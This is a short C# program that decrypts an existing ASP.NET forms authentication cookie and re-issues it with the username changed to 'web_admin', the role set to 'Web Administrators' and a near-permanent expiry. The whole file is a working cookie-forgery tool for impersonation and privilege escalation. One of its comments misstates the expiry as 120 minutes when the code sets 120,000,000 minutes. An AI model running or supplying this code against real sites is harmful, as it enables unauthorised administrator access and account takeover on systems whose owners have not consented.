using System;
using System.Web.Security;

namespace FormsEncryptor
{
    class Program
    {
        static void Main(string[] args)
        {
            // Take an existing forms cookie
            string encryptedTicket = "E6144BAF6A52D21C245C97C261FCB74EB3A7D83EC6F2EDF940DA34C7A154FF53E7F4F27C87A338F0BB428C1B61C1777F0C0BFDCE6D784D238AF5BCFEA0B35FEB5630242023BB507E319E4F9F75DAC97B7D593F027844B935B2CCB675A0F7EEDA68E0111F2E2811C2838D77B9CD03050C557833B66972A5E85B42459EFFB4B2F66D724F050E3B904F9C79CD04251138316FC899303C5537826AE6513204A7186D";
            string replacedUsername = "web_admin";
            string newRole = "Web Administrators";
            FormsAuthenticationTicket unencryptedTicket = FormsAuthentication.Decrypt(encryptedTicket);
            FormsAuthenticationTicket ticket = new FormsAuthenticationTicket(1,
                //unencryptedTicket.Name, //comment out if you want to change the username
                replacedUsername, //uncomment if you want to change the username
                DateTime.Now,
                DateTime.Now.AddMinutes(120000000), // Add 120 minutes to expiry
                unencryptedTicket.IsPersistent,
                newRole,
                "/");

            string encTicket = FormsAuthentication.Encrypt(ticket);
            Console.WriteLine(encTicket);
        }
    }
}
